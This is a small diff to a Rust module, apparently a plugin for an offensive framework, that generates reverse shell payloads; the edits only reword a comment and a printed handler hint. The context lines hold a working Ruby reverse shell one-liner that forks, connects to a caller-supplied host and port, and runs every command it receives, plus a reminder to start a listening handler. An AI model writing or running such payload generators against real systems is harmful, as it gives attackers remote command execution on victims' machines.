@@ -83,7 +83,7 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
         None => { eprintln!("[-] LPORT required"); return 1; }
     };
 
-    // Metasploit-style ruby reverse shell (backgrounded with fork)
+    // Ruby reverse shell (backgrounded with fork)
     let payload = format!(
         r#"ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{}","{}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'"#,
         lhost, lport
@@ -113,7 +113,7 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
     println!("\n=== Option 3: Full interactive (foreground) ===");
     println!("{}", payload_full);
 
-    println!("\n[*] Ensure handler is listening: use exploit/multi/handler");
+    println!("\n[*] Ensure handler is listening: use utilities/multi_handler");
 
     0
 }
